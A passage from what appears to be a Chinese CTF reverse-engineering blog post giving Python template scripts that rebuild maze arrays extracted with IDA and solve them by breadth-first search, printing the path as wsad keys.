class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br>    <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span><br>]<br>s = <span class="hljs-number">0</span>  <span class="hljs-comment"># s用作索引访问str, 供下面tmp列表取值</span><br><br><span class="hljs-comment"># 分析题目后设置迷宫的行列</span><br>row = <span class="hljs-number">16</span> <span class="hljs-comment"># 设置二维迷宫行数 input（）</span><br>col = <span class="hljs-number">16</span> <span class="hljs-comment"># 设置二维迷宫列数 input（）</span><br><br>maze = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(row):<br>    tmp = []<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(col):<br>        tmp.append(<span class="hljs-built_in">str</span>[s])<br>        s += <span class="hljs-number">1</span><br>    maze.append(tmp)  <span class="hljs-comment"># 凑一行添加一行到迷宫中</span><br><span class="hljs-built_in">print</span>(maze)<br><span class="hljs-comment"># 设置二维四向迷宫, 如果题目是多个小迷宫问题, 拆分多次调用脚本获取路径即可</span><br>path_len = <span class="hljs-number">54</span>+<span class="hljs-number">1</span>  <span class="hljs-comment"># 如果题目未给出终点坐标，则一定会指定路径的长度，在此处修改路径长度并+1，</span><br><span class="hljs-comment">#否则请保留path_len的极大值 0x7fffffff</span><br><br><br><span class="hljs-comment"># 进行BFS寻找路径</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bfs</span>(<span class="hljs-params">start, end, barrier</span>):<br>    directions = [(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)]  <span class="hljs-comment"># 定义四个方向的移动</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(maze)):  <span class="hljs-comment"># 获取起点和终点在列表中的索引</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(maze[i])):<br>            <span class="hljs-keyword">if</span> (maze[i][j] == start):<br>                start = (i, j)<br>            <span class="hljs-keyword">if</span> (maze[i][j] == end):<br>                end = (i, j)<br>    <span class="hljs-comment"># 以下均是bfs算法套路</span><br>    queue = deque()<br>    queue.append((start, [start]))  <span class="hljs-comment"># (当前位置, 路径)</span><br>    visited = <span class="hljs-built_in">set</span>()<br>    visited.add(start)<br>    <span class="hljs-keyword">while</span> queue:<br>        position, path = queue.popleft()<br>        <span class="hljs-keyword">if</span> position == end:<br>            <span class="hljs-keyword">return</span> path<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(path) == path_len:<br>            <span class="hljs-keyword">return</span> path<br>        <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> directions:<br>            next_position = (position[<span class="hljs-number">0</span>] + d[<span class="hljs-number">0</span>], position[<span class="hljs-number">1</span>] + d[<span class="hljs-number">1</span>])<br>            <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= next_position[<span class="hljs-number">0</span>] &lt; <span class="hljs-built_in">len</span>(maze) <span class="hljs-keyword">and</span> <span class="hljs-number">0</span> &lt;= next_position[<span class="hljs-number">1</span>] &lt; <span class="hljs-built_in">len</span>(maze[<span class="hljs-number">0</span>]) <span class="hljs-keyword">and</span> \<br>                    maze[next_position[<span class="hljs-number">0</span>]][next_position[<span class="hljs-number">1</span>]] != barrier <span class="hljs-keyword">and</span> next_position <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> visited:<br>                queue.append((next_position, path + [next_position]))<br>                visited.add(next_position)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-comment"># 执行BFS搜索并打印结果</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># maze[起点x坐标][起点y坐标] = &#x27;S&#x27; </span><br>    <span class="hljs-comment">#如果题目给了起点终点的坐标，</span><br>    <span class="hljs-comment">#在这里直接给起点和终点添加特征</span><br>    <span class="hljs-comment"># maze[终点x坐标][终点y坐标] = &#x27;E&#x27;</span><br>    maze[<span class="hljs-number">15</span>][<span class="hljs-number">1</span>]=<span class="hljs-string">&#x27;S&#x27;</span><br>    path = bfs(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-number">1</span>)  <span class="hljs-comment"># bfs函数传入参数代表起点、终点、障碍的特征(若题目给出的数据无特征, 手动添加特征即可, 通常障碍是1也有可能是0或其它字符如&#x27;#&#x27;)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;移动路径坐标：&quot;</span>, path)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;移动路径方位：&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(path)):<br>        x1, y1, x2, y2 = path[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>], path[i - <span class="hljs-number">1</span>][<span class="hljs-number">1</span>], path[i][<span class="hljs-number">0</span>], path[i][<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> (x1 &gt; x2):  <span class="hljs-comment"># 上</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;w&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> (x1 &lt; x2):  <span class="hljs-comment"># 下</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;s&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> (y1 &gt; y2):  <span class="hljs-comment"># 左</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> (y1 &lt; y2):  <span class="hljs-comment"># 右</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><h2 id="1）"><a href="#1）" class="headerlink" title="1）"></a>1）</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"># str为ida中使用快捷键[shift+e]提取到的数据, 如果提取的是string literal则加上引号视作字符串，如果是C array(decimal)则加上中括号视作列表<br>str = [<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">    1,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    1,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,<br><span class="hljs-built_in">    0,</span>   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    1,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    1,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,<br><span class="hljs-built_in">    1,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    0,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,<br><span class="hljs-built_in">    1,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    1,</span>   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    0,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    1,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    1,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    0,</span>   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,<br><span class="hljs-built_in">    1,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    0,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    1,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    1,</span>   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,<br><span class="hljs-built_in">    0,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    0,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    0,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    1,</span>   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,<br><span class="hljs-built_in">    0,</span>   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    0,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    1,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    1,</span>   <span class="hljs-number">0</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,<br><span class="hljs-built_in">    1,</span>   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span>,   <span class="hljs-number">1</span><br>]#待输入的迷宫数组<br>s = <span class="hljs-number">0</span>  # s用作索引访问str, 供下面tmp列表取值<br><br># 分析题目后设置迷宫的行列<br>row = <span class="hljs-number">16</span> # 设置二维迷宫行数<br>col = <span class="hljs-number">16</span> # 设置二维迷宫列数<br><br>maze = []<br><span class="hljs-title">for i in range(row):</span><br>    tmp = []<br><span class="hljs-title">    for j in range(col):</span><br>        tmp.append(str[s])<br>        s += <span class="hljs-number">1</span><br>    maze.append(tmp)  # 凑一行添加一行到迷宫中<br>print(maze)<br></code></pre></td></tr></table></figure><h2 id="2）"><a href="#2）" class="headerlink" title="2）"></a>2）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><br><span class="hljs-comment"># 设置二维四向迷宫, 如果题目是多个小迷宫问题, 拆分多次调用脚本获取路径即可</span><br>maze = [] <span class="hljs-comment">#二维列表迷宫，直接输入脚本1的二维数组</span><br>path_len = <span class="hljs-number">0x7fffffff</span>  <span class="hljs-comment"># 如果题目未给出终点坐标，则一定会指定路径的长度，在此处修改路径长度，否则请保留path_len的极大值</span><br><br><br><span class="hljs-comment"># 进行BFS寻找路径</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bfs</span>(<span class="hljs-params">start, end, barrier</span>):<br>    directions = [(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>), (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), (<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>), (-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>)]  <span class="hljs-comment"># 定义四个方向的移动</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(maze)):  <span class="hljs-comment"># 获取起点和终点在列表中的索引</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(maze[i])):<br>            <span class="hljs-keyword">if</span> (maze[i][j] == start):<br>                start = (i, j)<br>            <span class="hljs-keyword">if</span> (maze[i][j] == end):<br>                end = (i, j)<br>    <span class="hljs-comment"># 以下均是bfs算法套路</span><br>    queue = deque()<br>    queue.append((start, [start]))  <span class="hljs-comment"># (当前位置, 路径)</span><br>    visited = <span class="hljs-built_in">set</span>()<br>    visited.add(start)<br>    <span class="hljs-keyword">while</span> queue:<br>        position, path = queue.popleft()<br>        <span class="hljs-keyword">if</span> position == end:<br>            <span class="hljs-keyword">return</span> path<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(path) == path_len:<br>            <span class="hljs-keyword">return</span> path<br>        <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> directions:<br>            next_position = (position[<span class="hljs-number">0</span>] + d[<span class="hljs-number">0</span>], position[<span class="hljs-number">1</span>] + d[<span class="hljs-number">1</span>])<br>            <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= next_position[<span class="hljs-number">0</span>] &lt; <span class="hljs-built_in">len</span>(maze) <span class="hljs-keyword">and</span> <span class="hljs-number">0</span> &lt;= next_position[<span class="hljs-number">1</span>] &lt; <span class="hljs-built_in">len</span>(maze[<span class="hljs-number">0</span>]) <span class="hljs-keyword">and</span> \<br>            maze[next_position[<span class="hljs-number">0</span>]][next_position[<span class="hljs-number">1</span>]] != barrier <span class="hljs-keyword">and</span> next_position <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> visited:<br>                queue.append((next_position, path + [next_position]))<br>                visited.add(next_position)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-comment"># 执行BFS搜索并打印结果</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># maze[起点x坐标][起点y坐标] = &#x27;S&#x27; </span><br>    <span class="hljs-comment">#如果题目给了起点终点的坐标，在这里直接给起点和终点添加特征</span><br>    <span class="hljs-comment"># maze[终点x坐标][终点y坐标] = &#x27;E&#x27;</span><br>    <br>    path = bfs(<span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-number">1</span>)  <span class="hljs-comment"># bfs函数传入参数代表起点、终点、障碍的特征(若题目给出的数据无特征, 手动添加特征即可, 通常障碍是1也有可能是0或其它字符如&#x27;#&#x27;)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;移动路径坐标：&quot;</span>, path)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;移动路径方位：&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(path)):<br>        x1, y1, x2, y2 = path[i - <span class="hljs-number">1</span>][<span class="hljs-number">0</span>], path[i - <span class="hljs-number">1</span>][<span class="hljs-number">1</span>], path[i][<span class="hljs-number">0</span>], path[i][<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> (x1 &gt; x2):  <span class="hljs-comment"># 上</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;w&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> (x1 &lt; x2):  <span class="hljs-comment"># 下</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;s&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> (y1 &gt; y2):  <span class="hljs-comment"># 左</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> (y1 &lt; y2):  <span class="hljs-comment"># 右</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;d&quot;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>wsad可以根据题目要求更改键位</p><h2 id="3）"><a href="#3）" class="headerlink" title="3）"></a>3）</h2><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs inform7">maze = <span class="hljs-comment">[</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1]</span>,</span><br><span class="hljs-comment"> <span class="hljs-comment">[</span></span><br><span class="hljs-comment"><span class="hljs-comment">  1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 